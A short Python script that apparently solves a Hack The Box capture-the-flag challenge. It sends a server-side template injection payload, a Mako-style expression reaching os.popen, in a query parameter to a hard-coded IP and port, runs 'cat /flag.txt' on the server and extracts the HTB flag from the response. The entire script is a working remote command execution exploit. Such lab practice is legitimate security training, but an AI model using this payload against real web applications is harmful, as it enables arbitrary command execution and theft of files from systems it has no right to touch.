import requests
import re

host, port = "94.237.55.43", 57467


url = f"http://{host}:{port}"

payload = "${self.module.cache.util.os.popen('cat /flag.txt').read()}"

response = requests.get(url, params={"text":payload})

flag = re.search(r'HTB\{.*?\}',response.text)

print(flag.group())